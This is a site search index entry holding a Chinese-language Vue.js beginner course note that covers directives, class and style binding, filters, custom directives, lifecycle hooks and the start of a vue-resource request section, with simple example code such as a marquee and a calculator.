<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vue中Observer问题</title>
      <link href="/2019/09/02/vue/vuelearning/"/>
      <url>/2019/09/02/vue/vuelearning/</url>
      
        <content type="html"><![CDATA[<h2 id="Vue-js-Day1"><a href="#Vue-js-Day1" class="headerlink" title="Vue.js - Day1"></a>Vue.js - Day1</h2><h4 id="课程介绍"><a href="#课程介绍" class="headerlink" title="课程介绍"></a>课程介绍</h4><p>前5天： 都在学习Vue基本的语法和概念；打包工具 Webpack , Gulp<br>后5天： 以项目驱动教学；</p><h6 id="什么是Vue-js"><a href="#什么是Vue-js" class="headerlink" title="什么是Vue.js"></a>什么是Vue.js</h6><ul><li><p>Vue.js 是目前最火的一个前端框架，React是最流行的一个前端框架（React除了开发网站，还可以开发手机App， Vue语法也是可以用于进行手机App开发的，需要借助于Weex）</p></li><li><p>Vue.js 是前端的<strong>主流框架之一</strong>，和Angular.js、React.js 一起，并成为前端三大主流框架！</p></li><li><p>Vue.js 是一套构建用户界面的框架，<strong>只关注视图层</strong>，它不仅易于上手，还便于与第三方库或既有项目整合。（Vue有配套的第三方类库，可以整合起来做大型项目的开发）</p></li><li><p>前端的主要工作？主要负责MVC中的V这一层；主要工作就是和界面打交道，来制作前端页面效果；</p></li></ul><h4 id="为什么要学习流行框架"><a href="#为什么要学习流行框架" class="headerlink" title="为什么要学习流行框架"></a>为什么要学习流行框架</h4><ul><li>企业为了提高开发效率：在企业中，时间就是效率，效率就是金钱；<ul><li>企业中，使用框架，能够提高开发的效率；</li></ul></li></ul><ul><li>提高开发效率的发展历程：原生JS -&gt; Jquery之类的类库 -&gt; 前端模板引擎 -&gt; Angular.js / Vue.js（能够帮助我们减少不必要的DOM操作；提高渲染效率；双向数据绑定的概念【通过框架提供的指令，我们前端程序员只需要关心数据的业务逻辑，不再关心DOM是如何渲染的了】）</li><li>在Vue中，一个核心的概念，就是让用户不再操作DOM元素，解放了用户的双手，让程序员可以更多的时间去关注业务逻辑；</li></ul><ul><li>增强自己就业时候的竞争力<ul><li>人无我有，人有我优</li><li>你平时不忙的时候，都在干嘛？</li></ul></li></ul><h4 id="框架和库的区别"><a href="#框架和库的区别" class="headerlink" title="框架和库的区别"></a>框架和库的区别</h4><ul><li><p>框架：是一套完整的解决方案；对项目的侵入性较大，项目如果需要更换框架，则需要重新架构整个项目。</p><ul><li>node 中的 express；</li></ul></li></ul><ul><li>库（插件）：提供某一个小功能，对项目的侵入性较小，如果某个库无法完成某些需求，可以很容易切换到其它库实现需求。<ul><li><ol><li>从Jquery 切换到 Zepto</li></ol></li><li><ol start="2"><li>从 EJS 切换到 art-template</li></ol></li></ul></li></ul><h4 id="Node（后端）中的-MVC-与-前端中的-MVVM-之间的区别"><a href="#Node（后端）中的-MVC-与-前端中的-MVVM-之间的区别" class="headerlink" title="Node（后端）中的 MVC 与 前端中的 MVVM 之间的区别"></a>Node（后端）中的 MVC 与 前端中的 MVVM 之间的区别</h4><ul><li><p>MVC 是后端的分层开发概念；</p></li><li><p>MVVM是前端视图层的概念，主要关注于 视图层分离，也就是说：MVVM把前端的视图层，分为了 三部分 Model, View , VM ViewModel</p></li><li><p>为什么有了MVC还要有MVVM</p></li></ul><h4 id="Vue-js-基本代码-和-MVVM-之间的对应关系"><a href="#Vue-js-基本代码-和-MVVM-之间的对应关系" class="headerlink" title="Vue.js 基本代码 和 MVVM 之间的对应关系"></a>Vue.js 基本代码 和 MVVM 之间的对应关系</h4><h4 id="Vue之-基本的代码结构和插值表达式、v-cloak"><a href="#Vue之-基本的代码结构和插值表达式、v-cloak" class="headerlink" title="Vue之 - 基本的代码结构和插值表达式、v-cloak"></a>Vue之 - <code>基本的代码结构</code>和<code>插值表达式</code>、<code>v-cloak</code></h4><h4 id="Vue指令之v-text和v-html"><a href="#Vue指令之v-text和v-html" class="headerlink" title="Vue指令之v-text和v-html"></a>Vue指令之<code>v-text</code>和<code>v-html</code></h4><h4 id="Vue指令之v-bind的三种用法"><a href="#Vue指令之v-bind的三种用法" class="headerlink" title="Vue指令之v-bind的三种用法"></a>Vue指令之<code>v-bind</code>的三种用法</h4><ol><li><p>直接使用指令<code>v-bind</code></p></li><li><p>使用简化指令<code>:</code></p></li><li><p>在绑定的时候，拼接绑定内容：<code>:title="btnTitle + ', 这是追加的内容'"</code></p></li></ol><h4 id="Vue指令之v-on和跑马灯效果"><a href="#Vue指令之v-on和跑马灯效果" class="headerlink" title="Vue指令之v-on和跑马灯效果"></a>Vue指令之<code>v-on</code>和<code>跑马灯效果</code></h4><h6 id="跑马灯效果"><a href="#跑马灯效果" class="headerlink" title="跑马灯效果"></a>跑马灯效果</h6><ol><li>HTML结构：</li></ol><pre><code>&lt;div id="app"&gt;    &lt;p&gt;{{info}}&lt;/p&gt;    &lt;input type="button" value="开启" v-on:click="go"&gt;    &lt;input type="button" value="停止" v-on:click="stop"&gt;  &lt;/div&gt;</code></pre><ol start="2"><li>Vue实例：</li></ol><pre><code>    // 创建 Vue 实例，得到 ViewModel    var vm = new Vue({      el: '##app',      data: {        info: '猥琐发育，别浪~！',        intervalId: null      },      methods: {        go() {          // 如果当前有定时器在运行，则直接return          if (this.intervalId != null) {            return;          }          // 开始定时器          this.intervalId = setInterval(() =&gt; {            this.info = this.info.substring(1) + this.info.substring(0, 1);          }, 500);        },        stop() {          clearInterval(this.intervalId);        }      }    });</code></pre><h4 id="Vue指令之v-on的缩写和事件修饰符"><a href="#Vue指令之v-on的缩写和事件修饰符" class="headerlink" title="Vue指令之v-on的缩写和事件修饰符"></a>Vue指令之<code>v-on的缩写</code>和<code>事件修饰符</code></h4><h6 id="事件修饰符："><a href="#事件修饰符：" class="headerlink" title="事件修饰符："></a>事件修饰符：</h6><ul><li><p>.stop       阻止冒泡</p></li><li><p>.prevent    阻止默认事件</p></li><li><p>.capture    添加事件侦听器时使用事件捕获模式</p></li><li><p>.self       只当事件在该元素本身（比如不是子元素）触发时触发回调</p></li><li><p>.once       事件只触发一次</p></li></ul><h4 id="Vue指令之v-model和双向数据绑定"><a href="#Vue指令之v-model和双向数据绑定" class="headerlink" title="Vue指令之v-model和双向数据绑定"></a>Vue指令之<code>v-model</code>和<code>双向数据绑定</code></h4><h4 id="简易计算器案例"><a href="#简易计算器案例" class="headerlink" title="简易计算器案例"></a>简易计算器案例</h4><ol><li>HTML 代码结构</li></ol><pre><code>  &lt;div id="app"&gt;    &lt;input type="text" v-model="n1"&gt;    &lt;select v-model="opt"&gt;      &lt;option value="0"&gt;+&lt;/option&gt;      &lt;option value="1"&gt;-&lt;/option&gt;      &lt;option value="2"&gt;*&lt;/option&gt;      &lt;option value="3"&gt;÷&lt;/option&gt;    &lt;/select&gt;    &lt;input type="text" v-model="n2"&gt;    &lt;input type="button" value="=" v-on:click="getResult"&gt;    &lt;input type="text" v-model="result"&gt;  &lt;/div&gt;</code></pre><ol start="2"><li>Vue实例代码：</li></ol><pre><code>    // 创建 Vue 实例，得到 ViewModel    var vm = new Vue({      el: '##app',      data: {        n1: 0,        n2: 0,        result: 0,        opt: '0'      },      methods: {        getResult() {          switch (this.opt) {            case '0':              this.result = parseInt(this.n1) + parseInt(this.n2);              break;            case '1':              this.result = parseInt(this.n1) - parseInt(this.n2);              break;            case '2':              this.result = parseInt(this.n1) * parseInt(this.n2);              break;            case '3':              this.result = parseInt(this.n1) / parseInt(this.n2);              break;          }        }      }    });</code></pre><h4 id="在Vue中使用样式"><a href="#在Vue中使用样式" class="headerlink" title="在Vue中使用样式"></a>在Vue中使用样式</h4><h6 id="使用class样式"><a href="#使用class样式" class="headerlink" title="使用class样式"></a>使用class样式</h6><ol><li><p>数组</p><pre><code>&lt;h1 :class="['red', 'thin']"&gt;这是一个邪恶的H1&lt;/h1&gt;</code></pre></li><li><p>数组中使用三元表达式</p><pre><code>&lt;h1 :class="['red', 'thin', isactive?'active':'']"&gt;这是一个邪恶的H1&lt;/h1&gt;</code></pre></li><li><p>数组中嵌套对象</p><pre><code>&lt;h1 :class="['red', 'thin', {'active': isactive}]"&gt;这是一个邪恶的H1&lt;/h1&gt;</code></pre></li><li><p>直接使用对象</p><pre><code>&lt;h1 :class="{red:true, italic:true, active:true, thin:true}"&gt;这是一个邪恶的H1&lt;/h1&gt;</code></pre></li></ol><h6 id="使用内联样式"><a href="#使用内联样式" class="headerlink" title="使用内联样式"></a>使用内联样式</h6><ol><li><p>直接在元素上通过 <code>:style</code> 的形式，书写样式对象</p><pre><code>&lt;h1 :style="{color: 'red', 'font-size': '40px'}"&gt;这是一个善良的H1&lt;/h1&gt;</code></pre></li><li><p>将样式对象，定义到 <code>data</code> 中，并直接引用到 <code>:style</code> 中</p><ul><li>在data上定义样式：<pre><code>data: {   h1StyleObj: { color: 'red', 'font-size': '40px', 'font-weight': '200' }}</code></pre></li><li>在元素中，通过属性绑定的形式，将样式对象应用到元素中：<pre><code>&lt;h1 :style="h1StyleObj"&gt;这是一个善良的H1&lt;/h1&gt;</code></pre></li></ul></li><li><p>在 <code>:style</code> 中通过数组，引用多个 <code>data</code> 上的样式对象</p><ul><li>在data上定义样式：<pre><code>data: {   h1StyleObj: { color: 'red', 'font-size': '40px', 'font-weight': '200' },   h1StyleObj2: { fontStyle: 'italic' }}</code></pre></li><li>在元素中，通过属性绑定的形式，将样式对象应用到元素中：<pre><code>&lt;h1 :style="[h1StyleObj, h1StyleObj2]"&gt;这是一个善良的H1&lt;/h1&gt;</code></pre></li></ul></li></ol><h4 id="Vue指令之v-for和key属性"><a href="#Vue指令之v-for和key属性" class="headerlink" title="Vue指令之v-for和key属性"></a>Vue指令之<code>v-for</code>和<code>key</code>属性</h4><ol><li>迭代数组</li></ol><pre><code>&lt;ul&gt;  &lt;li v-for="(item, i) in list"&gt;索引：{{i}} --- 姓名：{{item.name}} --- 年龄：{{item.age}}&lt;/li&gt;&lt;/ul&gt;</code></pre><ol start="2"><li>迭代对象中的属性</li></ol><pre><code>    &lt;!-- 循环遍历对象身上的属性 --&gt;    &lt;div v-for="(val, key, i) in userInfo"&gt;{{val}} --- {{key}} --- {{i}}&lt;/div&gt;</code></pre><ol start="3"><li>迭代数字</li></ol><pre><code>&lt;p v-for="i in 10"&gt;这是第 {{i}} 个P标签&lt;/p&gt;</code></pre><blockquote><p>2.2.0+ 的版本里，<strong>当在组件中使用</strong> v-for 时，key 现在是必须的。</p></blockquote><p>当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “<strong>就地复用</strong>” 策略。如果数据项的顺序被改变，Vue将<strong>不是移动 DOM 元素来匹配数据项的顺序</strong>， 而是<strong>简单复用此处每个元素</strong>，并且确保它在特定索引下显示已被渲染过的每个元素。</p><p>为了给 Vue 一个提示，<strong>以便它能跟踪每个节点的身份，从而重用和重新排序现有元素</strong>，你需要为每项提供一个唯一 key 属性。</p><h4 id="Vue指令之v-if和v-show"><a href="#Vue指令之v-if和v-show" class="headerlink" title="Vue指令之v-if和v-show"></a>Vue指令之<code>v-if</code>和<code>v-show</code></h4><blockquote><p>一般来说，v-if 有更高的切换消耗而 v-show 有更高的初始渲染消耗。因此，如果需要频繁切换 v-show 较好，如果在运行时条件不大可能改变 v-if 较好。</p></blockquote><h4 id="品牌管理案例"><a href="#品牌管理案例" class="headerlink" title="品牌管理案例"></a>品牌管理案例</h4><h6 id="添加新品牌"><a href="#添加新品牌" class="headerlink" title="添加新品牌"></a>添加新品牌</h6><h6 id="删除品牌"><a href="#删除品牌" class="headerlink" title="删除品牌"></a>删除品牌</h6><h6 id="根据条件筛选品牌"><a href="#根据条件筛选品牌" class="headerlink" title="根据条件筛选品牌"></a>根据条件筛选品牌</h6><ol><li>1.x 版本中的filterBy指令，在2.x中已经被废除：</li></ol><p><a href="https://v1-cn.vuejs.org/api/##filterBy" target="_blank" rel="noopener">filterBy - 指令</a></p><pre><code>&lt;tr v-for="item in list | filterBy searchName in 'name'"&gt;  &lt;td&gt;{{item.id}}&lt;/td&gt;  &lt;td&gt;{{item.name}}&lt;/td&gt;  &lt;td&gt;{{item.ctime}}&lt;/td&gt;  &lt;td&gt;    &lt;a href="##" @click.prevent="del(item.id)"&gt;删除&lt;/a&gt;  &lt;/td&gt;&lt;/tr&gt;</code></pre><ol start="2"><li>在2.x版本中<a href="https://cn.vuejs.org/v2/guide/list.html##显示过滤-排序结果" target="_blank" rel="noopener">手动实现筛选的方式</a>：</li></ol><ul><li>筛选框绑定到 VM 实例中的 <code>searchName</code> 属性：</li></ul><pre><code>&lt;hr&gt; 输入筛选名称：&lt;input type="text" v-model="searchName"&gt;</code></pre><ul><li>在使用 <code>v-for</code> 指令循环每一行数据的时候，不再直接 <code>item in list</code>，而是 <code>in</code> 一个 过滤的methods 方法，同时，把过滤条件<code>searchName</code>传递进去：</li></ul><pre><code>&lt;tbody&gt;      &lt;tr v-for="item in search(searchName)"&gt;        &lt;td&gt;{{item.id}}&lt;/td&gt;        &lt;td&gt;{{item.name}}&lt;/td&gt;        &lt;td&gt;{{item.ctime}}&lt;/td&gt;        &lt;td&gt;          &lt;a href="##" @click.prevent="del(item.id)"&gt;删除&lt;/a&gt;        &lt;/td&gt;      &lt;/tr&gt;    &lt;/tbody&gt;</code></pre><ul><li><code>search</code> 过滤方法中，使用 数组的 <code>filter</code> 方法进行过滤：</li></ul><pre><code>search(name) {  return this.list.filter(x =&gt; {    return x.name.indexOf(name) != -1;  });}</code></pre><h4 id="Vue调试工具vue-devtools的安装步骤和使用"><a href="#Vue调试工具vue-devtools的安装步骤和使用" class="headerlink" title="Vue调试工具vue-devtools的安装步骤和使用"></a>Vue调试工具<code>vue-devtools</code>的安装步骤和使用</h4><p><a href="https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd?hl=zh-CN" target="_blank" rel="noopener">Vue.js devtools - 翻墙安装方式 - 推荐</a></p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>概念：Vue.js 允许你自定义过滤器，<strong>可被用作一些常见的文本格式化</strong>。过滤器可以用在两个地方：<strong>mustache 插值和 v-bind 表达式</strong>。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符指示；</p><h6 id="私有过滤器"><a href="#私有过滤器" class="headerlink" title="私有过滤器"></a>私有过滤器</h6><ol><li>HTML元素：</li></ol><pre><code>&lt;td&gt;{{item.ctime | dataFormat('yyyy-mm-dd')}}&lt;/td&gt;</code></pre><ol start="2"><li>私有 <code>filters</code> 定义方式：</li></ol><pre><code>filters: { // 私有局部过滤器，只能在 当前 VM 对象所控制的 View 区域进行使用    dataFormat(input, pattern = "") { // 在参数列表中 通过 pattern="" 来指定形参默认值，防止报错      var dt = new Date(input);      // 获取年月日      var y = dt.getFullYear();      var m = (dt.getMonth() + 1).toString().padStart(2, '0');      var d = dt.getDate().toString().padStart(2, '0');      // 如果 传递进来的字符串类型，转为小写之后，等于 yyyy-mm-dd，那么就返回 年-月-日      // 否则，就返回  年-月-日 时：分：秒      if (pattern.toLowerCase() === 'yyyy-mm-dd') {        return `${y}-${m}-${d}`;      } else {        // 获取时分秒        var hh = dt.getHours().toString().padStart(2, '0');        var mm = dt.getMinutes().toString().padStart(2, '0');        var ss = dt.getSeconds().toString().padStart(2, '0');        return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;      }    }  }</code></pre><blockquote><p>使用ES6中的字符串新方法 String.prototype.padStart(maxLength, fillString=’’) 或 String.prototype.padEnd(maxLength, fillString=’’)来填充字符串；</p></blockquote><h6 id="全局过滤器"><a href="#全局过滤器" class="headerlink" title="全局过滤器"></a>全局过滤器</h6><pre><code>// 定义一个全局过滤器Vue.filter('dataFormat', function (input, pattern = '') {  var dt = new Date(input);  // 获取年月日  var y = dt.getFullYear();  var m = (dt.getMonth() + 1).toString().padStart(2, '0');  var d = dt.getDate().toString().padStart(2, '0');  // 如果 传递进来的字符串类型，转为小写之后，等于 yyyy-mm-dd，那么就返回 年-月-日  // 否则，就返回  年-月-日 时：分：秒  if (pattern.toLowerCase() === 'yyyy-mm-dd') {    return `${y}-${m}-${d}`;  } else {    // 获取时分秒    var hh = dt.getHours().toString().padStart(2, '0');    var mm = dt.getMinutes().toString().padStart(2, '0');    var ss = dt.getSeconds().toString().padStart(2, '0');    return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;  }});</code></pre><blockquote><p>注意：当有局部和全局两个名称相同的过滤器时候，会以就近原则进行调用，即：局部过滤器优先于全局过滤器被调用！</p></blockquote><h4 id="键盘修饰符以及自定义键盘修饰符"><a href="#键盘修饰符以及自定义键盘修饰符" class="headerlink" title="键盘修饰符以及自定义键盘修饰符"></a>键盘修饰符以及自定义键盘修饰符</h4><h6 id="1-x中自定义键盘修饰符【了解即可】"><a href="#1-x中自定义键盘修饰符【了解即可】" class="headerlink" title="1.x中自定义键盘修饰符【了解即可】"></a>1.x中自定义键盘修饰符【了解即可】</h6><pre><code>Vue.directive('on').keyCodes.f2 = 113;</code></pre><h6 id="2-x中自定义键盘修饰符"><a href="#2-x中自定义键盘修饰符" class="headerlink" title="2.x中自定义键盘修饰符"></a><a href="https://cn.vuejs.org/v2/guide/events.html##键值修饰符" target="_blank" rel="noopener">2.x中自定义键盘修饰符</a></h6><ol><li>通过<code>Vue.config.keyCodes.名称 = 按键值</code>来自定义案件修饰符的别名：</li></ol><pre><code>Vue.config.keyCodes.f2 = 113;</code></pre><ol start="2"><li>使用自定义的按键修饰符：</li></ol><pre><code>&lt;input type="text" v-model="name" @keyup.f2="add"&gt;</code></pre><h4 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a><a href="https://cn.vuejs.org/v2/guide/custom-directive.html" target="_blank" rel="noopener">自定义指令</a></h4><ol><li>自定义全局和局部的 自定义指令：</li></ol><pre><code>    // 自定义全局指令 v-focus，为绑定的元素自动获取焦点：    Vue.directive('focus', {      inserted: function (el) { // inserted 表示被绑定元素插入父节点时调用        el.focus();      }    });    // 自定义局部指令 v-color 和 v-font-weight，为绑定的元素设置指定的字体颜色 和 字体粗细：      directives: {        color: { // 为元素设置指定的字体颜色          bind(el, binding) {            el.style.color = binding.value;          }        },        'font-weight': function (el, binding2) { // 自定义指令的简写形式，等同于定义了 bind 和 update 两个钩子函数          el.style.fontWeight = binding2.value;        }      }</code></pre><ol start="2"><li>自定义指令的使用方式：</li></ol><pre><code>&lt;input type="text" v-model="searchName" v-focus v-color="'red'" v-font-weight="900"&gt;</code></pre><h4 id="Vue-1-x-中-自定义元素指令【已废弃-了解即可】"><a href="#Vue-1-x-中-自定义元素指令【已废弃-了解即可】" class="headerlink" title="Vue 1.x 中 自定义元素指令【已废弃,了解即可】"></a>Vue 1.x 中 自定义元素指令【已废弃,了解即可】</h4><pre><code>Vue.elementDirective('red-color', {  bind: function () {    this.el.style.color = 'red';  }});</code></pre><p>使用方式：</p><pre><code>&lt;red-color&gt;1232&lt;/red-color&gt;</code></pre><h2 id="Vue-js-Day2"><a href="#Vue-js-Day2" class="headerlink" title="Vue.js - Day2"></a>Vue.js - Day2</h2><h4 id="品牌管理案例-1"><a href="#品牌管理案例-1" class="headerlink" title="品牌管理案例"></a>品牌管理案例</h4><h6 id="添加新品牌-1"><a href="#添加新品牌-1" class="headerlink" title="添加新品牌"></a>添加新品牌</h6><h6 id="删除品牌-1"><a href="#删除品牌-1" class="headerlink" title="删除品牌"></a>删除品牌</h6><h6 id="根据条件筛选品牌-1"><a href="#根据条件筛选品牌-1" class="headerlink" title="根据条件筛选品牌"></a>根据条件筛选品牌</h6><ol><li>1.x 版本中的filterBy指令，在2.x中已经被废除：</li></ol><p><a href="https://v1-cn.vuejs.org/api/##filterBy" target="_blank" rel="noopener">filterBy - 指令</a></p><pre><code>&lt;tr v-for="item in list | filterBy searchName in 'name'"&gt;  &lt;td&gt;{{item.id}}&lt;/td&gt;  &lt;td&gt;{{item.name}}&lt;/td&gt;  &lt;td&gt;{{item.ctime}}&lt;/td&gt;  &lt;td&gt;    &lt;a href="##" @click.prevent="del(item.id)"&gt;删除&lt;/a&gt;  &lt;/td&gt;&lt;/tr&gt;</code></pre><ol start="2"><li>在2.x版本中<a href="https://cn.vuejs.org/v2/guide/list.html##显示过滤-排序结果" target="_blank" rel="noopener">手动实现筛选的方式</a>：</li></ol><ul><li>筛选框绑定到 VM 实例中的 <code>searchName</code> 属性：</li></ul><pre><code>&lt;hr&gt; 输入筛选名称：&lt;input type="text" v-model="searchName"&gt;</code></pre><ul><li>在使用 <code>v-for</code> 指令循环每一行数据的时候，不再直接 <code>item in list</code>，而是 <code>in</code> 一个 过滤的methods 方法，同时，把过滤条件<code>searchName</code>传递进去：</li></ul><pre><code>&lt;tbody&gt;      &lt;tr v-for="item in search(searchName)"&gt;        &lt;td&gt;{{item.id}}&lt;/td&gt;        &lt;td&gt;{{item.name}}&lt;/td&gt;        &lt;td&gt;{{item.ctime}}&lt;/td&gt;        &lt;td&gt;          &lt;a href="##" @click.prevent="del(item.id)"&gt;删除&lt;/a&gt;        &lt;/td&gt;      &lt;/tr&gt;    &lt;/tbody&gt;</code></pre><ul><li><code>search</code> 过滤方法中，使用 数组的 <code>filter</code> 方法进行过滤：</li></ul><pre><code>search(name) {  return this.list.filter(x =&gt; {    return x.name.indexOf(name) != -1;  });}</code></pre><h4 id="Vue调试工具vue-devtools的安装步骤和使用-1"><a href="#Vue调试工具vue-devtools的安装步骤和使用-1" class="headerlink" title="Vue调试工具vue-devtools的安装步骤和使用"></a>Vue调试工具<code>vue-devtools</code>的安装步骤和使用</h4><p><a href="https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd?hl=zh-CN" target="_blank" rel="noopener">Vue.js devtools - 翻墙安装方式 - 推荐</a></p><h4 id="过滤器-1"><a href="#过滤器-1" class="headerlink" title="过滤器"></a>过滤器</h4><p>概念：Vue.js 允许你自定义过滤器，<strong>可被用作一些常见的文本格式化</strong>。过滤器可以用在两个地方：<strong>mustache 插值和 v-bind 表达式</strong>。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符指示；</p><h6 id="私有过滤器-1"><a href="#私有过滤器-1" class="headerlink" title="私有过滤器"></a>私有过滤器</h6><ol><li>HTML元素：</li></ol><pre><code>&lt;td&gt;{{item.ctime | dataFormat('yyyy-mm-dd')}}&lt;/td&gt;</code></pre><ol start="2"><li>私有 <code>filters</code> 定义方式：</li></ol><pre><code>filters: { // 私有局部过滤器，只能在 当前 VM 对象所控制的 View 区域进行使用    dataFormat(input, pattern = "") { // 在参数列表中 通过 pattern="" 来指定形参默认值，防止报错      var dt = new Date(input);      // 获取年月日      var y = dt.getFullYear();      var m = (dt.getMonth() + 1).toString().padStart(2, '0');      var d = dt.getDate().toString().padStart(2, '0');      // 如果 传递进来的字符串类型，转为小写之后，等于 yyyy-mm-dd，那么就返回 年-月-日      // 否则，就返回  年-月-日 时：分：秒      if (pattern.toLowerCase() === 'yyyy-mm-dd') {        return `${y}-${m}-${d}`;      } else {        // 获取时分秒        var hh = dt.getHours().toString().padStart(2, '0');        var mm = dt.getMinutes().toString().padStart(2, '0');        var ss = dt.getSeconds().toString().padStart(2, '0');        return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;      }    }  }</code></pre><blockquote><p>使用ES6中的字符串新方法 String.prototype.padStart(maxLength, fillString=’’) 或 String.prototype.padEnd(maxLength, fillString=’’)来填充字符串；</p></blockquote><h6 id="全局过滤器-1"><a href="#全局过滤器-1" class="headerlink" title="全局过滤器"></a>全局过滤器</h6><pre><code>// 定义一个全局过滤器Vue.filter('dataFormat', function (input, pattern = '') {  var dt = new Date(input);  // 获取年月日  var y = dt.getFullYear();  var m = (dt.getMonth() + 1).toString().padStart(2, '0');  var d = dt.getDate().toString().padStart(2, '0');  // 如果 传递进来的字符串类型，转为小写之后，等于 yyyy-mm-dd，那么就返回 年-月-日  // 否则，就返回  年-月-日 时：分：秒  if (pattern.toLowerCase() === 'yyyy-mm-dd') {    return `${y}-${m}-${d}`;  } else {    // 获取时分秒    var hh = dt.getHours().toString().padStart(2, '0');    var mm = dt.getMinutes().toString().padStart(2, '0');    var ss = dt.getSeconds().toString().padStart(2, '0');    return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;  }});</code></pre><blockquote><p>注意：当有局部和全局两个名称相同的过滤器时候，会以就近原则进行调用，即：局部过滤器优先于全局过滤器被调用！</p></blockquote><h4 id="键盘修饰符以及自定义键盘修饰符-1"><a href="#键盘修饰符以及自定义键盘修饰符-1" class="headerlink" title="键盘修饰符以及自定义键盘修饰符"></a>键盘修饰符以及自定义键盘修饰符</h4><h6 id="1-x中自定义键盘修饰符【了解即可】-1"><a href="#1-x中自定义键盘修饰符【了解即可】-1" class="headerlink" title="1.x中自定义键盘修饰符【了解即可】"></a>1.x中自定义键盘修饰符【了解即可】</h6><pre><code>Vue.directive('on').keyCodes.f2 = 113;</code></pre><h6 id="2-x中自定义键盘修饰符-1"><a href="#2-x中自定义键盘修饰符-1" class="headerlink" title="2.x中自定义键盘修饰符"></a><a href="https://cn.vuejs.org/v2/guide/events.html##键值修饰符" target="_blank" rel="noopener">2.x中自定义键盘修饰符</a></h6><ol><li>通过<code>Vue.config.keyCodes.名称 = 按键值</code>来自定义案件修饰符的别名：</li></ol><pre><code>Vue.config.keyCodes.f2 = 113;</code></pre><ol start="2"><li>使用自定义的按键修饰符：</li></ol><pre><code>&lt;input type="text" v-model="name" @keyup.f2="add"&gt;</code></pre><h4 id="自定义指令-1"><a href="#自定义指令-1" class="headerlink" title="自定义指令"></a><a href="https://cn.vuejs.org/v2/guide/custom-directive.html" target="_blank" rel="noopener">自定义指令</a></h4><ol><li>自定义全局和局部的 自定义指令：</li></ol><pre><code>    // 自定义全局指令 v-focus，为绑定的元素自动获取焦点：    Vue.directive('focus', {      inserted: function (el) { // inserted 表示被绑定元素插入父节点时调用        el.focus();      }    });    // 自定义局部指令 v-color 和 v-font-weight，为绑定的元素设置指定的字体颜色 和 字体粗细：      directives: {        color: { // 为元素设置指定的字体颜色          bind(el, binding) {            el.style.color = binding.value;          }        },        'font-weight': function (el, binding2) { // 自定义指令的简写形式，等同于定义了 bind 和 update 两个钩子函数          el.style.fontWeight = binding2.value;        }      }</code></pre><ol start="2"><li>自定义指令的使用方式：</li></ol><pre><code>&lt;input type="text" v-model="searchName" v-focus v-color="'red'" v-font-weight="900"&gt;</code></pre><h4 id="Vue-1-x-中-自定义元素指令【已废弃-了解即可】-1"><a href="#Vue-1-x-中-自定义元素指令【已废弃-了解即可】-1" class="headerlink" title="Vue 1.x 中 自定义元素指令【已废弃,了解即可】"></a>Vue 1.x 中 自定义元素指令【已废弃,了解即可】</h4><pre><code>Vue.elementDirective('red-color', {  bind: function () {    this.el.style.color = 'red';  }});</code></pre><p>使用方式：</p><pre><code>&lt;red-color&gt;1232&lt;/red-color&gt;</code></pre><h4 id="vue实例的生命周期"><a href="#vue实例的生命周期" class="headerlink" title="vue实例的生命周期"></a><a href="https://cn.vuejs.org/v2/guide/instance.html##实例生命周期" target="_blank" rel="noopener">vue实例的生命周期</a></h4><ul><li>什么是生命周期：从Vue实例创建、运行、到销毁期间，总是伴随着各种各样的事件，这些事件，统称为生命周期！</li><li><a href="https://cn.vuejs.org/v2/api/##选项-生命周期钩子" target="_blank" rel="noopener">生命周期钩子</a>：就是生命周期事件的别名而已；</li><li>生命周期钩子 = 生命周期函数 = 生命周期事件</li><li>主要的生命周期函数分类：<ul><li>创建期间的生命周期函数：<ul><li>beforeCreate：实例刚在内存中被创建出来，此时，还没有初始化好 data 和 methods 属性</li><li>created：实例已经在内存中创建OK，此时 data 和 methods 已经创建OK，此时还没有开始 编译模板</li><li>beforeMount：此时已经完成了模板的编译，但是还没有挂载到页面中</li><li>mounted：此时，已经将编译好的模板，挂载到了页面指定的容器中显示</li></ul></li><li>运行期间的生命周期函数：<ul><li>beforeUpdate：状态更新之前执行此函数， 此时 data 中的状态值是最新的，但是界面上显示的 数据还是旧的，因为此时还没有开始重新渲染DOM节点</li><li>updated：实例更新完毕之后调用此函数，此时 data 中的状态值 和 界面上显示的数据，都已经完成了更新，界面已经被重新渲染好了！</li></ul></li><li>销毁期间的生命周期函数：<ul><li>beforeDestroy：实例销毁之前调用。在这一步，实例仍然完全可用。</li><li>destroyed：Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。</li></ul></li></ul></li></ul><h4 id="vue-resource-实现-get-post-jsonp请求"><a href="#vue-resource-实现-get-post-jsonp请求" class="headerlink" title="vue-resource 实现 get, post, jsonp请求"></a><a href="https://github.com/pagekit/vue-resource" target="_blank" rel="noopener">vue-resource 实现 get, post, jsonp请求</a></h4><p>除了 vue-resource 之外，还可以使用 <code>axios</code> 的第三方包实现实现数据的请求</p><ol><li><p>之前的学习中，如何发起数据请求？</p></li><li><p>常见的数据请求类型？  get  post jsonp</p></li><li><p>测试的URL请求资源地址：</p><ul><li>get请求地址： <a href="http://vue.studyit.io/api/getlunbo" target="_blank" rel="noopener">http://vue.studyit.io/api/getlunbo</a></li><li>post请求地址：<a href="http://vue.studyit.io/api/post" target="_blank" rel="noopener">http://vue.studyit.io/api/post</a></li><li>jsonp请求地址：<a href="http://vue.studyit.io/api/jsonp" target="_blank" rel="noopener">http://vue.studyit.io/api/jsonp</a></li></ul></li><li><p>JSONP的实现原理</p><ul><li><p>由于浏览器的安全性限制，不允许AJAX访问 协议不同、域名不同、端口号不同的 